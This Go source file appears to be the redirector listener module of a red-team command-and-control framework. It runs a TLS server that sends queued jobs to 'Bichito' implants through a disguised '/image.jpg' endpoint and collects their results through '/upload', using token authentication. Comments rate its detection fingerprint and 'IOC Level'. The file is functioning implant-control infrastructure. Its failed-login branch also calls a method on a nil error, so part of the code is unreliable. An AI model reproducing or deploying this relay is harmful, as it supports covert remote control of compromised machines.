// +build paranoidhttpsgo
//// Listening Network Module for Redirectors ///////////////////////////////////////////////////////////
//
//	 Network Method: HTTP Listen to an open port with a TLS connection using a personnal certificate
//					 generated previously in Implant Generation. The Bichito checks the target tls
//					 signature to make sure is the redirector
//
//   Warnings:       Could not work with MITM tls proxies.					 
//					 
//	 Fingenprint:    GO-LANG TLS Libraries for the http Server 
//
//   IOC Level:      Medium
//   
//
///////////////////////////////////////////////////////////////////////////////////////////////////////

package main

import (

	"crypto/tls"
    "github.com/gorilla/mux"
    "net/http"
    "encoding/json"
    "bytes"
    "fmt"
    "time"
    //Debug
    //"net/http/httputil"

)

/*
JSON Structures for Compiling Redirectors Network Module parameters
Hive will have the same definitions in: ./src/hive/hiveImplants.go
*/
type RedParanoidhttps struct {
	Port string   `json:"port"`
}

type BiAuth struct {
    Bid string   `json:"bid"`
    Token string  `json:"token"`  
}

/*
Description: Paranoidhttps Module Redirector Handler
Flow:
A. Extract from the JSON Encoded string the parameters needed for this module
B. Start the https servlet. Define Endpoints.
C. Start the https server
*/

func bichitoHandler(){

	//Decode Module Parameters, create listener socket
	var moduleParams *RedParanoidhttps
	errDaws := json.Unmarshal([]byte(redconfig.Coms),&moduleParams)
    if errDaws != nil {
        //ErrorLog
        addLog("Network(Listener JSON decoding error)"+errDaws.Error())
    }
    socket := "0.0.0.0:" + moduleParams.Port

    router := mux.NewRouter()
    router.Use(commonMiddleware)

    //Hive Servlet - Users
    router.HandleFunc("/image.jpg", SendJobs).Methods("GET")
    router.HandleFunc("/upload", ReceiveJob).Methods("POST")

    //TLS configurations
    cfg := &tls.Config{
        MinVersion:               tls.VersionTLS12,
        CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
        PreferServerCipherSuites: true,
        CipherSuites: []uint16{
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
            tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_RSA_WITH_AES_256_CBC_SHA,
        },
    }
    srv := &http.Server{
        ReadHeaderTimeout: 10 *time.Second,
        ReadTimeout: 20 * time.Second,
        WriteTimeout: 40 * time.Second,
        Addr:         socket,
        Handler:      router,
        TLSConfig:    cfg,
        TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
    }

    err := srv.ListenAndServeTLS("red.pem", "red.key")
    if err != nil {
    	//ErrorLog
        fmt.Println("Error starting https server:"+err.Error())
		addLog("Network(Listener Starting Error)"+err.Error())
        panic(err)
    }

}

func commonMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Add("Content-Type", "application/json")
        next.ServeHTTP(w, r)
    })
}

//Retrieve all the Jobs that need to be sent back to target Bot
func SendJobs(w http.ResponseWriter, r *http.Request) {
    
    //Auth
    bid := biAuth(r.Header.Get("Authorization"))
    if bid == "Bad"{
        return
    }    

    json.NewEncoder(w).Encode(getBiJobs(bid))
    
}


//Redirector posting the jobs they have finished/unfinished
func ReceiveJob(w http.ResponseWriter, r *http.Request) {

    //Auth
    bid := biAuth(r.Header.Get("Authorization"))
    if bid == "Bad"{
        return
    }     

    decoder := json.NewDecoder(r.Body)
    var jobs []*Job
    err := decoder.Decode(&jobs)
    if err != nil {
		go addLog("Jobs(Error Decoding Bichito Job)"+err.Error())
		return
    }

    go processJobs(jobs)

}


// Check Authorization header for a JSON encoded object:
// Authorization: JSON{domain,token}
// If a valid token, process, if not drop connection and log

func biAuth(authbearer string) string{

    var biauth *BiAuth
    //Decode auth bearer
    decoder := json.NewDecoder(bytes.NewBufferString(authbearer))
    err := decoder.Decode(&biauth)

    if err != nil{
        go addLog("Bichito Authentication Json Decoding Error"+err.Error())
        return "Bad"
    }

    if biauth.Token == redconfig.BiToken{
        return biauth.Bid
    }

	go addLog("Bichito bad login!"+err.Error())
    return "Bad"

}